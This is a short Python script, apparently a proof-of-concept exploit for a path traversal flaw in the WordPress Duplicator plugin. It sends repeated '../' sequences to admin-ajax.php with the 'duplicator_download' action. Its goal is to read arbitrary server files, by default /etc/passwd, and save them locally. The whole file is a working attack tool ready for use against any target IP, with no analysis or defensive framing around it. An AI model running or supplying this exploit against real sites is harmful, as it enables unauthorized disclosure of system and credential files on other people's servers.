import requests
from urllib.parse import urljoin

class WordPressDuplicatorExploit:
    def __init__(self, target_url, filepath, depth):
        self.target_url = target_url
        self.filepath = filepath
        self.depth = depth

    def construct_traversal_path(self):
        # Create the traversal string
        traversal = '../' * self.depth
        # Normalize the filepath to remove leading slash if present
        filename = self.filepath[1:] if self.filepath.startswith('/') else self.filepath
        return f"{traversal}{filename}"

    def exploit(self):
        traversal_path = self.construct_traversal_path()
        # Construct the URL for the exploit
        exploit_url = urljoin(self.target_url, 'wp-admin/admin-ajax.php')
        params = {
            'action': 'duplicator_download',
            'file': traversal_path
        }
        
        # Send the HTTP GET request
        response = requests.get(exploit_url, params=params)

        # Check the response
        if response.status_code == 200 and response.text:
            print("[+] Successfully accessed the file:")
            print(response.text)
            return response.text
        else:
            print("[-] Failed to access the file. Server responded with status code:", response.status_code)
            return None

    def save_to_file(self, data, output_filename):
        with open(output_filename, 'w') as file:
            file.write(data)
        print(f"[+] File saved as: {output_filename}")

# Example usage
if __name__ == "__main__":
    target_url = 'http://<target-ip>/wordpress/'  # Replace <target-ip> with the actual IP address of the target
    filepath = '/etc/passwd'  # Change this to the file you want to read
    depth = 5  # Traversal depth to reach the root folder

    exploit = WordPressDuplicatorExploit(target_url, filepath, depth)
    file_content = exploit.exploit()
    if file_content:
        exploit.save_to_file(file_content, 'downloaded_file.txt')
